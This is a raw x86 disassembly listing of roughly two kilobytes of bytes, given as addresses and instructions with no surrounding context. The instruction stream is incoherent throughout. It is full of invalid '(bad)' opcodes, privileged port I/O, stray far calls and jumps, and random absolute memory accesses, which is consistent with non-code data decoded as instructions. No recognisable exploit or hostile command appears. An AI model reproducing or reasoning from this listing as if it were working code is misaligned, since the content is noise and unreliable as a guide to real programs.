  4295a3:	jno    0x42954a
  4295a5:	jge    0x429590
  4295a7:	xor    al,0xf
  4295a9:	daa    
  4295aa:	es pop ecx
  4295ac:	jl     0x42960e
  4295ae:	pop    ss
  4295af:	push   0xf60a77db
  4295b4:	dec    ebx
  4295b5:	pop    esi
  4295b6:	and    dl,cl
  4295b8:	dec    eax
  4295b9:	xchg   esp,eax
  4295ba:	jle    0x429580
  4295bc:	jle    0x4295c0
  4295be:	inc    ebx
  4295bf:	bound  ebx,QWORD PTR [esi-0x6d]
  4295c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295c3:	mov    ds:0x2e4215f9,al
  4295c8:	sahf   
  4295c9:	mov    ds:0xe729fe5,al
  4295ce:	cdq    
  4295cf:	push   ss
  4295d0:	push   ds
  4295d1:	dec    ebp
  4295d2:	mov    ds:0xea6a21a4,al
  4295d7:	cmp    ch,0x5c
  4295da:	in     eax,dx
  4295db:	mov    edi,0x975f2dde
  4295e0:	retf   0x6ae8
  4295e3:	mov    eax,ds:0x1f8fbd68
  4295e8:	and    ecx,DWORD PTR [ebx]
  4295ea:	xor    al,0x6d
  4295ec:	push   ebx
  4295ed:	cmp    DWORD PTR [esi+ebp*1+0x7dd94b5e],eax
  4295f4:	mov    ch,0x98
  4295f6:	jmp    0x429598
  4295f8:	out    dx,al
  4295f9:	stos   BYTE PTR es:[edi],al
  4295fa:	cmp    dl,BYTE PTR [edx+0x2bd77c04]
  429600:	hlt    
  429601:	pop    edi
  429602:	out    dx,al
  429603:	(bad)  
  429604:	fs retf 0x5725
  429608:	mov    dh,al
  42960a:	mov    bl,0xa0
  42960c:	cmp    eax,0x4bcd75be
  429611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429612:	xor    DWORD PTR [esi],ebx
  429614:	pop    esi
  429615:	fistp  WORD PTR [edi+0x51]
  429618:	mov    edx,0xb2da4032
  42961d:	jl     0x42969a
  42961f:	mul    DWORD PTR ds:0x87597c69
  429625:	cmc    
  429626:	out    0x66,eax
  429628:	loope  0x4295d4
  42962a:	ds test eax,0xa16302ed
  429630:	popa   
  429631:	cld    
  429632:	or     BYTE PTR [esi],ah
  429634:	scas   al,BYTE PTR es:[edi]
  429635:	cld    
  429636:	retf   0x5f68
  429639:	sbb    ah,BYTE PTR [ebp-0x7f3f5325]
  42963f:	push   ecx
  429640:	push   es
  429641:	ss lahf 
  429643:	mov    al,ds:0xc218e8c0
  429648:	cmp    al,0x84
  42964a:	or     cl,bl
  42964c:	pop    esi
  42964d:	popf   
  42964e:	aas    
  42964f:	jecxz  0x4295e8
  429651:	adc    al,0x7c
  429653:	sbb    edx,DWORD PTR [ebp+0x66]
  429656:	and    cl,BYTE PTR [ecx-0x23]
  429659:	dec    esp
  42965a:	jmp    DWORD PTR [esi-0x55]
  42965d:	lahf   
  42965e:	sbb    BYTE PTR [ecx],al
  429660:	inc    ecx
  429661:	dec    edi
  429662:	add    bh,BYTE PTR [ebp+0x4b]
  429665:	nop
  429666:	sub    eax,0xa8243a2a
  42966b:	inc    eax
  42966c:	sbb    dh,0x44
  42966f:	mov    ecx,0x8f60b467
  429674:	fiadd  WORD PTR [ecx-0x44]
  429677:	pusha  
  429678:	mov    ebp,0xa895dfb4
  42967d:	gs out dx,al
  42967f:	push   ds
  429680:	mov    WORD PTR [ebp-0x46ddf124],fs
  429686:	das    
  429687:	mov    eax,ds:0xdacc2313
  42968c:	stc    
  42968d:	lock sub al,0x76
  429690:	pop    esi
  429691:	inc    ebp
  429692:	push   esp
  429693:	or     al,0x92
  429695:	xlat   BYTE PTR ds:[ebx]
  429696:	cmc    
  429697:	test   al,0x7a
  429699:	enter  0x8f27,0x6
  42969d:	fld    DWORD PTR [edi]
  42969f:	and    DWORD PTR [esi+0x1ebdb410],edx
  4296a5:	leave  
  4296a6:	out    0x28,eax
  4296a8:	cld    
  4296a9:	stos   DWORD PTR es:[edi],eax
  4296aa:	mov    bl,0xb7
  4296ac:	ds aaa 
  4296ae:	fwait
  4296af:	mov    ecx,0xed0c6161
  4296b4:	fiadd  DWORD PTR [edx+0x6b562a37]
  4296ba:	out    dx,al
  4296bb:	mov    edi,0x74e525e3
  4296c0:	in     al,dx
  4296c1:	mov    edi,0xf3d0a113
  4296c6:	std    
  4296c7:	xchg   BYTE PTR [eax+eax*2],al
  4296ca:	pop    ecx
  4296cb:	clc    
  4296cc:	pop    esi
  4296cd:	fwait
  4296ce:	repnz ins DWORD PTR es:[edi],dx
  4296d0:	and    BYTE PTR [eax],0x99
  4296d3:	(bad)  
  4296d4:	pop    ebx
  4296d5:	popa   
  4296d6:	push   ebp
  4296d7:	shl    edi,1
  4296d9:	mov    eax,ds:0x23210c5c
  4296de:	out    dx,al
  4296df:	test   BYTE PTR [edi+0x498bd884],dh
  4296e5:	xchg   esi,eax
  4296e6:	(bad)  
  4296e7:	lea    esp,[ecx+0x1f2182b7]
  4296ed:	enter  0x2d65,0x53
  4296f1:	repnz out dx,al
  4296f3:	ins    BYTE PTR es:[edi],dx
  4296f4:	cmp    al,0x7e
  4296f6:	sub    eax,0xdc1abe48
  4296fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296fc:	shr    DWORD PTR [esi-0x42],0xb7
  429700:	mov    edi,0x5e525ed5
  429705:	pusha  
  429706:	lds    edx,FWORD PTR [ebx+0x250544dc]
  42970c:	mov    eax,0xd60e0460
  429711:	mov    al,ds:0x401e1052
  429716:	out    dx,al
  429717:	push   edx
  429718:	mov    ds:0xf010bcaf,al
  42971d:	xchg   BYTE PTR [edx],ch
  42971f:	mov    eax,ds:0x428bc4e5
  429724:	xor    ecx,DWORD PTR [ebx-0x3da1d5e4]
  42972a:	push   ecx
  42972b:	mov    edx,DWORD PTR [esi]
  42972d:	call   0xa14b:0xa72cca29
  429734:	jmp    0x9e24:0xb1da677e
  42973b:	jp     0x4297af
  42973d:	sbb    ebp,edx
  42973f:	sub    edx,edx
  429741:	das    
  429742:	push   ss
  429743:	rcr    esi,cl
  429745:	cmp    eax,0x171e5645
  42974a:	push   es
  42974b:	and    esi,edx
  42974d:	add    dl,0x77
  429750:	dec    edi
  429751:	sub    eax,0xf35fc2c8
  429756:	mov    cl,0xd6
  429758:	out    dx,al
  429759:	mov    eax,0x60e33bca
  42975e:	shr    BYTE PTR [edi+0x74601506],cl
  429764:	push   ecx
  429765:	sti    
  429766:	out    dx,al
  429767:	cmp    BYTE PTR [eax],dh
  429769:	iret   
  42976a:	pushf  
  42976b:	ret    0xcffe
  42976e:	jae    0x429711
  429770:	or     al,0x55
  429772:	ret    
  429773:	mov    ds:0x30145c26,eax
  429778:	pusha  
  429779:	xchg   edx,eax
  42977a:	dec    edx
  42977b:	push   ebx
  42977c:	mov    ch,BYTE PTR [edx+0x74]
  42977f:	loope  0x429776
  429781:	scas   eax,DWORD PTR es:[edi]
  429782:	jns    0x429761
  429784:	sub    eax,ebp
  429786:	out    dx,al
  429787:	repnz xchg edi,eax
  429789:	and    BYTE PTR [esi+0x34],dh
  42978c:	inc    eax
  42978d:	add    dh,ch
  42978f:	jmp    0x429749
  429791:	stos   BYTE PTR es:[edi],al
  429792:	cmc    
  429793:	xor    ah,ah
  429795:	arpl   WORD PTR [eax-0x7c4521a9],sp
  42979b:	les    ecx,FWORD PTR [esi]
  42979d:	repz jmp 0x429729
  4297a0:	pop    esi
  4297a1:	xchg   al,dl
  4297a3:	pop    eax
  4297a4:	ins    DWORD PTR es:[edi],dx
  4297a5:	aam    0x8f
  4297a7:	ja     0x429782
  4297a9:	inc    esp
  4297aa:	dec    ecx
  4297ab:	jns    0x429763
  4297ad:	loopne 0x429740
  4297af:	xchg   esp,eax
  4297b0:	retf   
  4297b1:	pushf  
  4297b2:	xor    dl,bl
  4297b4:	pop    esi
  4297b5:	in     eax,dx
  4297b6:	adc    al,dh
  4297b8:	adc    edi,ecx
  4297ba:	jno    0x42980e
  4297bc:	loopne 0x42981e
  4297be:	xchg   BYTE PTR [ecx+0x57827290],dl
  4297c4:	out    dx,al
  4297c5:	aad    0x5c
  4297c7:	jle    0x429827
  4297c9:	jge    0x429823
  4297cb:	mov    ds:0x7955a5e8,eax
  4297d0:	jns    0x429832
  4297d2:	cs mov esp,0xd0e0b28e
  4297d8:	xor    bh,bh
  4297da:	out    0xf,eax
  4297dc:	mov    cl,0x49
  4297de:	or     DWORD PTR [ebp-0x62],0x742ecafd
  4297e5:	pusha  
  4297e6:	(bad)  
  4297e7:	ins    DWORD PTR es:[edi],dx
  4297e8:	sub    DWORD PTR [esp+esi*4-0x11506e89],ebp
  4297ef:	mov    edi,0x9b2330f
  4297f4:	in     eax,0x12
  4297f6:	inc    ebp
  4297f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297f8:	and    DWORD PTR [edi+0x243db1e8],0x66
  4297ff:	test   BYTE PTR [esi+0x5e96dfee],0x3
  429806:	ffreep st(0)
  429808:	mov    ecx,0x296d3db2
  42980d:	pop    edi
  42980e:	lock mov bh,0xf5
  429811:	pushf  
  429812:	push   ecx
  429813:	pop    esi
  429814:	imul   eax,eax,0x6088b4bc
  42981a:	(bad)  
  42981b:	in     al,dx
  42981c:	int3   
  42981d:	jmp    0x42984c
  42981f:	mov    esp,0x6ee7e03f
  429824:	mov    ds:0xae8561fd,al
  429829:	sub    al,0x48
  42982b:	mov    bl,0x4f
  42982d:	inc    ebx
  42982e:	or     dl,cl
  429830:	and    DWORD PTR [esi-0x35],ebx
  429833:	adc    eax,0xb16fca03
  429838:	jae    0x429868
  42983a:	pushf  
  42983b:	div    DWORD PTR [ebx]
  42983d:	(bad)
  429840:	daa    
  429841:	jns    0x4297e5
  429843:	jb     0x64e40a19
  429849:	call   0x1fda3abe
  42984e:	arpl   WORD PTR [ebp-0x594b5aa2],dx
  429854:	mov    WORD PTR [eax+0x5a],cs
  429857:	(bad)
  42985a:	pop    eax
  42985b:	hlt    
  42985c:	xchg   esp,eax
  42985d:	sbb    DWORD PTR [ebp-0x2e6a84cc],ebp
  429863:	outs   dx,BYTE PTR ds:[esi]
  429864:	imul   ebx,ecx,0xffffffae
  429867:	mov    DWORD PTR [esi],ecx
  429869:	loop   0x4298b5
  42986b:	push   ss
  42986c:	test   BYTE PTR [eax-0xc],ah
  42986f:	and    al,0x1e
  429871:	push   es
  429872:	scas   eax,DWORD PTR es:[edi]
  429873:	in     ax,0x53
  429876:	out    dx,al
  429877:	in     al,dx
  429878:	fldcw  WORD PTR [eax]
  42987a:	xchg   BYTE PTR [esi-0x75],bl
  42987d:	dec    ebp
  42987e:	xchg   edx,eax
  42987f:	mov    eax,ds:0x833d21aa
  429884:	adc    eax,0x5e96260e
  429889:	or     dh,ah
  42988b:	xchg   ebx,edi
  42988d:	xchg   edx,eax
  42988e:	rcr    BYTE PTR [edi+0x16],0xf1
  429892:	shr    DWORD PTR [edx+0x2c],cl
  429895:	addr16 inc ebx
  429897:	or     ebx,esi
  429899:	les    edx,FWORD PTR [esi]
  42989b:	out    dx,al
  42989c:	sbb    BYTE PTR [edi-0x44a07bf4],0x21
  4298a3:	(bad)  
  4298a4:	cli    
  4298a5:	jmp    0xd34fda2f
  4298aa:	mov    bh,0xa0
  4298ac:	les    ebp,FWORD PTR [edi-0x7df0f892]
  4298b2:	xor    bl,BYTE PTR ds:[esi-0x28]
  4298b6:	dec    ebp
  4298b7:	pushf  
  4298b8:	inc    ebp
  4298b9:	retf   0xb24
  4298bc:	(bad)  
  4298bd:	push   edx
  4298be:	jbe    0x429854
  4298c0:	je     0x429932
  4298c2:	cs call 0xe349d714
  4298c8:	pop    esi
  4298c9:	sahf   
  4298ca:	xor    al,0xf5
  4298cc:	shl    DWORD PTR [ebx],0x2a
  4298cf:	test   BYTE PTR [edi],dh
  4298d1:	popa   
  4298d2:	or     BYTE PTR [eax+0x74],ch
  4298d5:	pop    ecx
  4298d6:	aaa    
  4298d7:	push   eax
  4298d8:	mov    dh,0x16
  4298da:	loopne 0x429905
  4298dc:	push   0x195ebedd
  4298e1:	xchg   esi,ebp
  4298e3:	out    0x61,eax
  4298e5:	gs push esp
  4298e7:	xchg   eax,ecx
  4298e9:	push   ecx
  4298ea:	adc    eax,0xad1fefb0
  4298ef:	fs ss cwde 
  4298f2:	jecxz  0x429940
  4298f4:	test   al,0x87
  4298f6:	xlat   BYTE PTR ds:[ebx]
  4298f7:	pop    ss
  4298f8:	pop    esi
  4298f9:	sub    eax,0xdda1292d
  4298fe:	pusha  
  4298ff:	jae    0x429965
  429901:	popa   
  429902:	mov    al,ds:0x87cd7de5
  429907:	inc    esi
  429908:	push   esp
  429909:	(bad)  
  42990a:	(bad)  
  42990b:	inc    BYTE PTR [edi-0x63b2517f]
  429911:	out    dx,al
  429912:	mov    bl,0x2c
  429914:	dec    edx
  429915:	inc    esp
  429916:	outs   dx,BYTE PTR ds:[esi]
  429917:	mov    bh,0xf6
  429919:	popf   
  42991a:	adc    al,0x1f
  42991c:	add    eax,eax
  42991e:	sahf   
  42991f:	fistp  QWORD PTR [esi]
  429921:	pop    ecx
  429922:	out    dx,al
  429923:	jecxz  0x429955
  429925:	add    al,0xde
  429927:	mov    esi,0xa19c3fe5
  42992c:	and    esi,DWORD PTR [edx+edx*4-0x37]
  429930:	(bad)  
  429931:	push   edi
  429932:	shl    BYTE PTR [ebp+ebx*2-0x11ecf5c8],1
  429939:	and    eax,0x49ee4fd9
  42993e:	lods   al,BYTE PTR ds:[esi]
  42993f:	mul    bh
  429941:	xor    dh,dh
  429943:	mov    al,ds:0xc981c0c7
  429948:	scas   al,BYTE PTR es:[edi]
  429949:	daa    
  42994a:	dec    eax
  42994b:	inc    edx
  42994c:	pop    esi
  42994d:	sub    DWORD PTR [ebx-0x74bbc856],edi
  429953:	mov    ecx,0x4a7c6112
  429958:	jnp    0x429965
  42995a:	ss mov bh,0x31
  42995d:	sub    dh,ch
  42995f:	xor    dl,bl
  429961:	imul   ecx,eax,0xbc57990b
  429967:	mov    al,ds:0xe9a6cd80
  42996c:	push   esi
  42996d:	add    DWORD PTR [esi+0x5a],ecx
  429970:	xor    eax,DWORD PTR [esi+0x57622157]
  429976:	inc    eax
  429977:	out    0x7f,al
  429979:	xor    BYTE PTR [ecx+eiz*4+0x72],bl
  42997d:	int    0x2d
  42997f:	iret   
  429980:	test   DWORD PTR [ebx+0x16],edx
  429983:	dec    edx
  429984:	pop    esi
  429985:	adc    bh,BYTE PTR [esp-0x56]
  429989:	aad    0xd7
  42998b:	xor    eax,0xa0c2beea
  429990:	inc    eax
  429991:	push   edx
  429992:	sub    bl,BYTE PTR [eax+0x3a040993]
  429998:	gs xor dl,dl
  42999b:	mov    ebp,0x73f8e14d
  4299a0:	shl    bh,cl
  4299a2:	push   edx
  4299a3:	adc    DWORD PTR [ebx-0x6a7dd8a0],esi
  4299a9:	pop    es
  4299aa:	push   ds
  4299ab:	(bad)  
  4299ad:	cli    
  4299ae:	out    dx,al
  4299af:	xchg   edx,eax
  4299b0:	jno    0x4299e3
  4299b2:	std    
  4299b3:	pop    ecx
  4299b4:	adc    ah,cl
  4299b6:	mov    DWORD PTR [ecx],ecx
  4299b8:	or     BYTE PTR [ebx-0x71],dh
  4299bb:	cmp    al,0x9c
  4299bd:	pop    ebp
  4299be:	clc    
  4299bf:	div    BYTE PTR [ecx+0x5218182]
  4299c5:	(bad)  
  4299c6:	popf   
  4299c7:	jae    0x429a45
  4299c9:	jmp    DWORD PTR [eax]
  4299cb:	std    
  4299cc:	cdq    
  4299cd:	cli    
  4299ce:	xlat   BYTE PTR ds:[ebx]
  4299cf:	mov    edx,0xb0df85e
  4299d4:	sbb    ecx,0x9306a0e5
  4299da:	add    ebx,edi
  4299dc:	into   
  4299dd:	ins    BYTE PTR es:[edi],dx
  4299de:	cld    
  4299df:	repz out dx,eax
  4299e1:	cld    
  4299e2:	jle    0x429a45
  4299e4:	xor    eax,0x87a137b8
  4299e9:	lock sub eax,0x89bbec78
  4299ef:	mov    eax,ds:0x91ccdbbf
  4299f4:	mov    eax,ds:0x7c352499
  4299f9:	out    0xee,eax
  4299fb:	push   ebx
  4299fc:	lahf   
  4299fd:	sub    BYTE PTR [ecx+0x784187cf],dh
  429a03:	mov    eax,ds:0xa87db964
  429a08:	cmp    DWORD PTR [edi-0x14a10844],esi
  429a0e:	mov    ecx,DWORD PTR ds:0x1a655bca
  429a14:	enter  0x382a,0xf1
  429a18:	inc    ecx
  429a19:	popa   
  429a1a:	mov    ebp,0xa127fcf9
  429a1f:	(bad)  
  429a20:	cwde   
  429a21:	aas    
  429a22:	out    dx,al
  429a23:	enter  0x6a92,0x3a
  429a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a28:	push   eax
  429a29:	daa    
  429a2a:	xchg   esp,eax
  429a2b:	xor    DWORD PTR [ebp-0x44aed1a0],eax
  429a31:	pop    ebx
  429a32:	icebp  
  429a33:	sbb    ah,BYTE PTR [ecx]
  429a35:	cmp    ebp,esi
  429a37:	popa   
  429a38:	sub    DWORD PTR [edx+edi*8],esp
  429a3b:	ds jne 0x429a70
  429a3e:	les    ebx,FWORD PTR [esi-0xce9bf69]
  429a44:	sahf   
  429a45:	sbb    DWORD PTR [edx],0xefbe36ec
  429a4b:	(bad)  
  429a4c:	std    
  429a4d:	and    al,0xa3
  429a4f:	popa   
  429a50:	fcmovnbe st,st(2)
  429a52:	mov    ch,0xc9
  429a54:	shl    BYTE PTR [eax-0x2e],1
  429a57:	jmp    0xf41973f
  429a5c:	ror    DWORD PTR [edx-0x12],cl
  429a5f:	sub    eax,0x59445466
  429a64:	jno    0x429ac4
  429a66:	mov    dh,0xa0
  429a68:	das    
  429a69:	stos   DWORD PTR es:[edi],eax
  429a6a:	dec    ecx
  429a6b:	int    0x1b
  429a6d:	add    al,BYTE PTR [edx+0x965527b]
  429a73:	mov    ebx,DWORD PTR [esi-0x2f]
  429a76:	(bad)  
  429a77:	jo     0x429af7
  429a79:	into   
  429a7a:	mov    gs,WORD PTR [eax+0x198ccbe9]
  429a80:	push   edx
  429a81:	popa   
  429a82:	add    ebx,DWORD PTR [ebx+0x1f]
  429a85:	mov    ah,0xee
  429a87:	mov    ebx,0xebb58173
  429a8c:	push   cs
  429a8d:	mov    dl,0x47
  429a8f:	mov    ds:0x6f1b30d7,eax
  429a94:	cwde   
  429a95:	test   BYTE PTR [esi],ch
  429a97:	cmp    DWORD PTR [ebp+0x4042eef4],0x56f2889b
  429aa1:	xor    bh,ah
  429aa3:	scas   eax,DWORD PTR es:[edi]
  429aa4:	mov    ch,BYTE PTR [ebp+0x58200f6e]
  429aaa:	(bad)  
  429aab:	pop    esi
  429aac:	arpl   WORD PTR [esi],bx
  429aae:	out    dx,al
  429aaf:	fidivr WORD PTR [esi+ebp*2+0xfd261f6]
  429ab6:	or     bl,BYTE PTR [edx+esi*8+0x594f66fc]
  429abd:	pop    DWORD PTR ds:0xde9d0961
  429ac3:	pop    ds
  429ac4:	push   esp
  429ac5:	push   ss
  429ac6:	or     BYTE PTR [edx+0x1bbce3de],bh
  429acc:	loop   0x429b37
  429ace:	ja     0x429ac3
  429ad0:	jae    0x429a8a
  429ad2:	lock mov al,ds:0xa7c81158
  429ad8:	dec    ebp
  429ad9:	icebp  
  429ada:	sub    edx,DWORD PTR [ebp+0x5e]
  429add:	push   esi
  429ade:	mov    dh,0xda
  429ae0:	push   ebx
  429ae1:	imul   ecx,DWORD PTR [edx+0x2a21b8],0xffffffa1
  429ae8:	mov    ebp,0xf686b7cb
  429aed:	frndint 
  429aef:	sahf   
  429af0:	pop    esi
  429af1:	cli    
  429af2:	add    al,0x5e
  429af4:	lods   eax,DWORD PTR ds:[esi]
  429af5:	sti    
  429af6:	daa    
  429af7:	out    0xdc,eax
  429af9:	sub    ebp,eax
  429afb:	cmc    
  429afc:	stos   DWORD PTR es:[edi],eax
  429afd:	dec    esi
  429afe:	push   es
  429aff:	xor    BYTE PTR [ecx],bh
  429b01:	dec    ebp
  429b02:	xchg   DWORD PTR [edx+0x42],edi
  429b05:	cmp    esp,DWORD PTR [ebp-0x73]
  429b08:	cmc    
  429b09:	mov    al,ds:0x1c62fbcf
  429b0e:	mov    cl,0x40
  429b10:	pop    esi
  429b11:	jl     0x429aad
  429b13:	add    al,0x8c
  429b15:	(bad)  
  429b16:	retf   0xcbd9
  429b19:	pop    ecx
  429b1a:	push   esp
  429b1b:	xchg   edx,eax
  429b1c:	dec    ecx
  429b1d:	jle    0x429ac9
  429b1f:	jo     0x429b7b
  429b21:	stos   BYTE PTR es:[edi],al
  429b22:	mov    ds:0xb86826b0,eax
  429b27:	mov    al,ds:0x6308106e
  429b2c:	inc    edi
  429b2d:	cwde   
  429b2e:	scas   eax,DWORD PTR es:[edi]
  429b2f:	push   0xd9b45e2b
  429b34:	fnstenv ds:0x74bf542e
  429b3a:	outs   dx,BYTE PTR ds:[esi]
  429b3b:	push   cs
  429b3c:	jae    0x429b6f
  429b3e:	out    dx,al
  429b3f:	inc    edi
  429b40:	add    al,0x8d
  429b42:	lods   al,BYTE PTR ds:[esi]
  429b43:	adc    ch,BYTE PTR [ecx+0x4c]
  429b46:	repnz mov al,ds:0xdf4fcc16
  429b4c:	mov    edi,0x591b2ba9
  429b51:	idiv   DWORD PTR [ecx]
  429b53:	(bad)  
  429b54:	jmp    0x6d67:0xb5182e11
  429b5b:	mov    eax,ds:0x511ba809
  429b60:	xchg   ebp,eax
  429b61:	js     0x429b4c
  429b63:	pusha  
  429b64:	pop    esi
  429b65:	add    BYTE PTR [ebx],cl
  429b67:	mov    ebp,0x989bb4fc
  429b6c:	dec    esp
  429b6d:	popa   
  429b6e:	cdq    
  429b6f:	fadd   QWORD PTR [esp+edi*1]
  429b72:	(bad)  
  429b73:	add    al,0x16
  429b75:	xor    ch,dh
  429b77:	mov    ds:0x694b00cc,eax
  429b7c:	cmp    al,0x12
  429b7e:	retf   
  429b7f:	mov    WORD PTR [eax-0x59dedaba],?
  429b85:	ror    BYTE PTR [ebp-0x269cc95a],cl
  429b8b:	jno    0x429beb
  429b8d:	add    al,0xb4
  429b8f:	or     eax,0xb2595454
  429b94:	push   edx
  429b95:	mov    ax,ds:0x6eb633a0
  429b9b:	test   al,0x26
  429b9d:	fdiv   st(0),st
  429b9f:	cld    
  429ba0:	das    
  429ba1:	imul   ebp,edi,0x12
  429ba4:	push   ebp
  429ba5:	dec    esi
  429ba6:	retf   0x8960
  429ba9:	dec    esi
  429baa:	mov    ch,0xc
  429bac:	out    dx,al
  429bad:	pusha  
  429bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429baf:	jne    0x429b8f
  429bb1:	sbb    eax,0xa30a886b
  429bb6:	out    0xc2,eax
  429bb8:	add    BYTE PTR [ebx],0xc3
  429bbb:	cmp    ch,BYTE PTR [eax-0x65]
  429bbe:	out    dx,al
  429bbf:	push   esi
  429bc0:	push   esp
  429bc1:	lods   eax,DWORD PTR ds:[esi]
  429bc2:	dec    edx
  429bc3:	mov    bl,0x2e
  429bc5:	popa   
  429bc6:	mov    edi,DWORD PTR cs:[eax+eax*2-0x4e2745ed]
  429bce:	out    dx,al
  429bcf:	add    ch,BYTE PTR [esi-0x2]
  429bd2:	sub    BYTE PTR [edi+0x22],bh
  429bd5:	jo     0x429ba2
  429bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bd8:	jno    0x429b76
  429bda:	(bad)
  429bdf:	sub    esi,DWORD PTR [esp+esi*4+0x589116ec]
  429be6:	and    edx,DWORD PTR [edi-0x50d1d471]
  429bec:	xchg   ebx,eax
  429bed:	fucomp st(6)
  429bef:	and    DWORD PTR [esi+eiz*2-0x46a2243c],0xffffffa4
  429bf7:	test   eax,0x350a03c5
  429bfc:	mov    ds:0x325e3460,eax
  429c01:	dec    eax
  429c02:	dec    ebx
  429c03:	jnp    0x429c64
  429c05:	jmp    0x5b47892e
  429c0a:	das    
  429c0b:	push   0x16c50cbe
  429c10:	xchg   esi,eax
  429c11:	pusha  
  429c12:	push   cs
  429c13:	leave  
  429c14:	shl    BYTE PTR [esp+ecx*1-0x1111870f],cl
  429c1b:	les    edi,FWORD PTR [edi]
  429c1d:	push   ebx
  429c1e:	cmp    dl,ah
  429c20:	icebp  
  429c21:	int3   
  429c22:	and    DWORD PTR [ecx],ebp
  429c24:	sbb    DWORD PTR [ecx-0x5e],esp
  429c27:	mov    WORD PTR [ecx-0x36733528],ds
  429c2d:	inc    edx
  429c2e:	out    dx,al
  429c2f:	stos   BYTE PTR es:[edi],al
  429c30:	pop    ss
  429c31:	jle    0x429bd1
  429c33:	outs   dx,BYTE PTR ds:[esi]
  429c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c35:	leave  
  429c36:	inc    esp
  429c37:	mov    eax,ds:0x612f2e66
  429c3c:	in     al,dx
  429c3d:	xchg   DWORD PTR [ebp+edx*4+0x5e],ebx
  429c41:	into   
  429c42:	pop    edi
  429c43:	sbb    DWORD PTR [edx-0x5357c7f8],ebp
  429c49:	pusha  
  429c4a:	xor    dh,BYTE PTR [ecx-0x38]
  429c4d:	sub    eax,0x3bce6a49
  429c52:	out    dx,al
  429c53:	retf   
  429c54:	les    esp,FWORD PTR [edi+ebx*2]
  429c57:	and    edx,DWORD PTR [edi-0x85ee605]
  429c5d:	call   0x817d:0x9b9412d4
  429c64:	pop    edi
  429c65:	pop    ss
  429c66:	mov    edx,0xe6908a59
  429c6b:	js     0x429c49
  429c6d:	rol    esi,cl
  429c6f:	mov    al,ds:0x56242e11
  429c74:	scas   al,BYTE PTR es:[edi]
  429c75:	inc    esp
  429c76:	sbb    al,0xe4
  429c78:	jmp    0x429c40
  429c7a:	in     eax,dx
  429c7b:	aam    0xd0
  429c7d:	pop    ds
  429c7e:	ja     0x429cb3
  429c80:	out    0x7f,al
  429c82:	adc    al,0x31
  429c84:	dec    eax
  429c85:	push   ebp
  429c86:	jmp    0x429c66
  429c88:	repz jno 0x429cd7
  429c8b:	xchg   ch,ch
  429c8d:	clc    
  429c8e:	aad    0xcd
  429c90:	xchg   ecx,eax
  429c91:	pusha  
  429c92:	js     0x429cee
  429c94:	jg     0x429c31
  429c96:	ins    BYTE PTR es:[edi],dx
  429c97:	xor    BYTE PTR [edi-0x3a],cl
  429c9a:	dec    esi
  429c9b:	cmp    BYTE PTR [ebx+0x2c],bl
  429c9e:	pushf  
  429c9f:	mov    esi,0xa0f5d780
  429ca4:	sbb    bl,BYTE PTR [eax+0x60e22c7f]
  429caa:	daa    
  429cab:	aam    0x64
  429cad:	dec    edx
  429cae:	mov    dh,0x46
  429cb0:	dec    eax
  429cb1:	sbb    bl,BYTE PTR [esi-0x40c7a1ac]
  429cb7:	xchg   BYTE PTR [ebp+0x2e],cl
  429cba:	addr16 mov eax,0x61d860e8
  429cc0:	xchg   BYTE PTR [eax-0x64],bl
  429cc3:	cmp    eax,0xd4eeaba6
  429cc8:	shl    BYTE PTR [ecx+esi*4],0x24
  429ccc:	jb     0x429d4d
  429cce:	push   ebx
  429ccf:	mov    eax,ds:0x45418f8b
  429cd4:	aad    0x9b
  429cd6:	rcl    BYTE PTR [eax+0x3c7ded64],1
  429cdc:	inc    ebx
  429cdd:	(bad)  
  429cde:	out    dx,al
  429cdf:	adc    bl,BYTE PTR [edi]
  429ce1:	and    ch,BYTE PTR [ebp+0x40]
  429ce4:	fisttp WORD PTR [esi-0x6c]
  429ce7:	or     DWORD PTR [ebp+0x60],edi
  429cea:	leave  
  429ceb:	jb     0x429cef
  429ced:	outs   dx,DWORD PTR ds:[esi]
  429cee:	pop    esi
  429cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cf0:	jb     0x429cf2
  429cf2:	out    dx,eax
  429cf3:	aad    0x58
  429cf5:	hlt    
  429cf6:	loop   0x429d12
  429cf8:	daa    
  429cf9:	lahf   
  429cfa:	mov    esp,0xa5babca0
  429cff:	imul   ecx,eax,0x385019d5
  429d05:	add    eax,DWORD PTR [edi]
  429d07:	mov    ds:0x60e7d36c,al
  429d0c:	and    DWORD PTR [ebp+0x417bc346],0x6047653e
  429d16:	add    ebp,DWORD PTR [edx]
  429d18:	rcr    esi,1
  429d1a:	mov    ds:0xeef886b1,al
  429d1f:	jo     0x429d57
  429d21:	mov    ah,0x20
  429d23:	sbb    BYTE PTR [esi],dl
  429d25:	sahf   
  429d26:	mov    eax,0x53431ba0
  429d2b:	call   0x8a5e:0x9ad9151
  429d32:	shl    BYTE PTR [ebx],1
  429d34:	outs   dx,DWORD PTR ds:[esi]
  429d35:	gs jle 0x429d8e
  429d38:	je     0x429d9a
  429d3a:	add    bh,BYTE PTR [esi]
  429d3c:	xor    eax,0xba298d1f
  429d41:	xor    BYTE PTR [edx],al
  429d43:	sar    BYTE PTR [ecx],0x46
  429d46:	sub    DWORD PTR [ebp+eiz*1-0x7d639134],esi
  429d4d:	xor    dh,BYTE PTR [edi+0x6aa58aa0]
  429d53:	mov    esp,0x272bd590
  429d58:	xor    ch,BYTE PTR [ecx+0x7dc42119]
  429d5e:	je     0x429d62
  429d60:	xor    DWORD PTR [esi-0x24035646],0xefe0006e
  429d6a:	push   edx
  429d6b:	or     ecx,DWORD PTR [ecx+0x5253ee35]
  429d71:	loope  0x429d34
  429d73:	imul   DWORD PTR [esi]
  429d75:	loopne 0x429da2
  429d77:	mov    eax,ds:0x338db327
  429d7c:	pop    ss
  429d7d:	and    al,0x8e
  429d7f:	adc    al,0x5e
  429d81:	ss add al,0x4f
  429d84:	mov    bl,0xcc
  429d86:	mov    ebp,DWORD PTR [ebp-0x6f]
  429d89:	pusha  
  429d8a:	icebp  
  429d8b:	xchg   esp,eax
